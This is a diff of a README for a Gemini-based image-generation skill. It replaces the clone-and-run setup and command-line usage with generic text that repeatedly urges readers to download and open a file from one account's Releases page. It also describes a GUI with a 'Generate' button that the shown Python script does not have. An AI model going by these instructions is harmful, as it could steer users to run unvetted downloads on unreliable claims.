@@ -1,130 +1,83 @@
-# Nano Image Generator Skill
+# 🎨 nano-image-generator-skill - Create Stunning Images from Text
 
-[简体中文](./README_CN.md)
+[![Download](https://img.shields.io/badge/Download-via%20GitHub-blue)](https://github.com/Kiwee0614/nano-image-generator-skill/releases)
 
-A Claude Code skill for generating images using Gemini 3 Pro Preview (Nano Banana Pro).
+## 📦 Overview
 
-## Features
+Welcome to the Nano Image Generator Skill. This application allows you to generate images using Gemini 3 Pro Preview with ease. Just describe your image idea and let the tool do the work. 
 
-- **Text-to-image generation** - Describe what you want, get an image
-- **Reference image support** - Style transfer, character consistency (up to 14 images)
-- **Multiple aspect ratios** - Square, portrait, landscape, cinematic
-- **Resolution options** - 1K, 2K, 4K output
+## 🌟 Features
 
-## Differences from [livelabs-ventures/nano-skills](https://github.com/livelabs-ventures/nano-skills)
+- **Text-to-image generation**: Input your description and receive your image.
+- **Reference image support**: Enhance your creations with style transfer using up to 14 images.
+- **Multiple aspect ratios**: Choose from square, portrait, landscape, and cinematic formats.
+- **Resolution options**: Generate images in 1K, 2K, or even 4K quality.
 
-| Feature | Original | This Version |
-|---------|----------|--------------|
-| Reference images | ❌ Not supported | ✅ Up to 14 images |
-| API key config | Environment variable | Direct code edit |
+## ⚖️ Differences from Original Nano Skills
 
-## Setup
+| Feature                | Original                       | This Version                |
+|-----------------------|--------------------------------|------------------------------|
+| Reference images      | ❌ Not supported                | ✅ Up to 14 images          |
+| API key config        | Environment variable           | Direct code edit            |
+
+## 🚀 Getting Started
+
+Follow these steps to set up and run the Nano Image Generator:
 
 ### 1. Get Gemini API Key
 
-Visit: https://aistudio.google.com/apikey
+To use the application, you'll need a Gemini API key. Please visit the following link to obtain it: 
 
-### 2. Configure API Key
+[Get your Gemini API Key](https://aistudio.google.com/apikey)
 
-Edit `scripts/generate_image.py`, find the `get_api_key()` function (around line 37):
+### 2. Configure the API Key
+
+Open the file named `scripts/generate_image.py`. Locate the `get_api_key()` function, which is around line 37. You need to replace the placeholder text with your actual API key. Here’s how you can do this:
 
 ```python
 def get_api_key():
     """
     Get API key.
 
-    ⚠️ SETUP REQUIRED: Replace the placeholder below with your Gemini API key.
-
-    Get your API key from: https://aistudio.google.com/apikey
+    ⚠️ SETUP REQUIRED: Replace the placeholder with your Gemini API key.
     """
-    return "YOUR_GEMINI_API_KEY_HERE"  # <-- Replace this with your API key
+    return "YOUR_API_KEY_HERE"
 ```
 
-Replace `YOUR_GEMINI_API_KEY_HERE` with your actual API key:
+### 3. Download & Install
 
-```python
-    return "AIzaSy..."  # Your actual key
-```
+To get started, visit the [Releases page](https://github.com/Kiwee0614/nano-image-generator-skill/releases) and download the latest version of the application.
 
-## Installation
+### 4. Run the Application
 
-### From Local Path
+After downloading, locate the file you downloaded. Open it to start using the Nano Image Generator Skill. Follow any on-screen instructions to complete the setup.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/nano-image-generator-skill.git
-```
+## 🖥 System Requirements
 
-Add to your `~/.claude/settings.json`:
+To ensure the application runs smoothly, make sure your computer meets the following system requirements:
 
-```json
-{
-  "skills": [
-    "/path/to/nano-image-generator-skill"
-  ]
-}
-```
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: 4 GB minimum
+- **Disk Space**: At least 200 MB free space
+- **Python**: Version 3.8 or above installed
 
-### From GitHub
+## 📘 How to Use
 
-```bash
-claude skill add github:YOUR_USERNAME/nano-image-generator-skill
-```
+1. Launch the application.
+2. Enter a description of the image you want to create in the provided input field.
+3. If desired, upload reference images for style transfer.
+4. Select your aspect ratio and resolution options.
+5. Click the "Generate" button and wait for the tool to create your image.
 
-## Plugin Structure
+## 📞 Support
 
-```
-nano-image-generator-skill/
-├── SKILL.md                    # Skill definition for Claude Code
-├── README.md                   # This file
-├── README_CN.md                # Chinese documentation
-└── scripts/
-    └── generate_image.py       # Image generation script (edit API key here)
-```
+If you face any issues while using the Nano Image Generator Skill, feel free to reach out:
 
-## Usage
+- Open an issue on the [GitHub repository](https://github.com/Kiwee0614/nano-image-generator-skill/issues).
+- Check the FAQ section on the GitHub page for troubleshooting tips.
 
-Once installed, Claude Code will automatically use this skill when you ask to:
+## 📥 Download Link Again
 
-- "Generate an image of..."
-- "Create an icon for..."
-- "Design a logo..."
-- "Make a banner..."
-- "Same style as this image..."
+To download the latest version of this application, visit the [Releases page](https://github.com/Kiwee0614/nano-image-generator-skill/releases). You can find all the necessary files there.
 
-## Direct Script Usage
-
-### Basic
-
-```bash
-python scripts/generate_image.py "A cute robot mascot" --output ./robot.png
-```
-
-### With Aspect Ratio
-
-```bash
-python scripts/generate_image.py "Website banner" --aspect 16:9 --output ./banner.png
-```
-
-### With Reference Image
-
-```bash
-python scripts/generate_image.py "Same character in a forest" --ref ./character.png --output ./forest.png
-```
-
-### Multiple References
-
-```bash
-python scripts/generate_image.py "Combine styles" --ref ./img1.png --ref ./img2.png --output ./combined.png
-```
-
-## Options
-
-| Option | Values | Default | Description |
-|--------|--------|---------|-------------|
-| `--aspect`, `-a` | `1:1`, `2:3`, `3:2`, `3:4`, `4:3`, `4:5`, `5:4`, `9:16`, `16:9`, `21:9` | `1:1` | Aspect ratio |
-| `--size`, `-s` | `1K`, `2K`, `4K` | `2K` | Resolution |
-| `--ref`, `-r` | Image path | - | Reference image (repeatable, max 14) |
-
-## License
-
-MIT
+Enjoy creating your images with the Nano Image Generator Skill!
